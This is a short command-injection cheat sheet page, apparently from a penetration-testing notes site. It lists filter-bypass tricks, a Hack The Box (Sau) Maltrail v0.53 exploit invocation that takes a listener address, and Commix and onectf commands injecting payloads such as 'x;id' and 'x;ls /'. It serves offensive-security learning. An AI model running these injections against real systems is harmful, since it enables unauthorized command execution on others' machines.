# Command injection

<div class="row row-cols-lg-2"><div>

Refer to [injection](/cybersecurity/red-team/s4.privesc/linux/utils/injection.md#special-scenarios-) if you need to inject something in the arguments of a custom script.

* Windows Slash (`$env:HOMEPATH[0]`)
* Direct access to a program in a jail?
* <code>"\'\`{ls,-a}\`\'"</code> (error but execute)

#### Mailtrail v0.53

[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

[POC (python script)](https://github.com/spookier/Maltrail-v0.53-Exploit) <small>(0.05k ‚≠ê)</small>.

```shell!
$ python3 exploit.py listener_ip listener_port URL
```
</div><div>

**Tools** üìö

* [Commix](https://github.com/commixproject/commix) <small>(5.2k ‚≠ê)</small> can detect and automatically exploit applications. It was coded in a similar way that SQLMap for SQL injections.

```ps
$ pipx install git+https://github.com/commixproject/commix.git
$ commix -u 'URL' -d 'xxx=*' # POST request, xxx vulnerable
```

* For manual testing, you can use [onectf request](https://github.com/QuentinRa/onectf/blob/main/docs/request.md) <small>(0.01k ‚≠ê)</small> that automatically [URL encode](/tools-and-frameworks/knowledge/encoding/index.md#url-encoding---) the payload.

```ps
$ pipx install git+https://github.com/QuentinRa/onectf.git
$ onectf request -u 'URL' -v -X POST -p 'xxx' -i 'x;id'
$ onectf request -u 'URL' -v -X POST -p 'xxx' -i 'x;ls<tab>/'
$ onectf request -u 'URL' -v -X POST -p 'xxx' -i 'x;ls /' --tamper aliases,space2tab
```

üìö The wordlists [special-chars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt) can be handy.
</div></div>